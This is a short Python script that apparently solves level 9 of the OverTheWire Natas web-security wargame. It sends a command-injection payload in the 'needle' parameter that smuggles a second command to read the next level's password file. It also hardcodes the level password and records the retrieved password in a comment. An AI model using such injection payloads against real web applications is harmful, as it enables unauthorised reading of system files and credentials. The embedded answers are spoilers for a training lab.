import requests

level = str(9)
pw = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"

# grep -i -v foo /etc/natas_webpass/natas10; cat dictionary.txt
params = [("needle", "-v foo /etc/natas_webpass/natas10; cat ")]

s = requests.Session()
s.auth = ('natas'+level, pw)

r = s.get(url, params=params)

print(r.text)

# nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu